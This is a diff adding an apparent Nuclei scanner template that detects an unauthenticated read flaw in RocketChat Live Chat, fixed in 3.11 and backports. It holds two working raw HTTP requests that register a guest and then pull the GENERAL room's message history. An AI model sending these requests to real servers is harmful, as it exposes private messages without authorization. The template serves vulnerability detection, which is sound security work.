@@ -1,0 +1,53 @@
+id: rocketchat-unauth-access
+
+info:
+  name: RocketChat Live Chat - Unauthenticated Read Access
+  author: rojanrijal
+  severity: high
+  description: RocketChat Live Chat accepts invalid parameters that could potentially allow unauthenticated access to messages and user tokens.
+  remediation: Fixed in versions 3.11, 3.10.5, 3.9.7, and 3.8.8.
+  reference:
+    - https://docs.rocket.chat/guides/security/security-updates
+    - https://securifyinc.com/disclosures/rocketchat-unauthenticated-access-to-messages
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-522
+  metadata:
+    max-request: 2
+  tags: rocketchat,unauth
+variables:
+  value: "{{to_lower(rand_text_alpha(5))}}"
+  user_email: "{{username}}@{{to_lower(rand_text_alphanumeric(6))}}.com"
+
+http:
+  - raw:
+      - |
+        POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/json
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+
+        {"message":"{\"msg\":\"method\",\"method\":\"livechat:registerGuest\",\"params\":[{\"token\":\"{{value}}\",\"name\":\"cve-2020-{{value}}\",\"email\":\"{{user_email}}\"}],\"id\":\"123\"}"}
+      - |
+        POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/json
+
+        {"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"{{value}}\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"{\"msg\":\"result\",\"result\":{\"messages\"'
+          - '"success":true'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a0048304602210096428ae02f14e01e9b1ab8349ab23f90add75776d479f16f3f72ad32a8faef94022100c282bb308e83dcc91acd2711e9e200557b79a40d18443cf144ec912089bc2461:922c64590222798bb761d5b6d8e72950
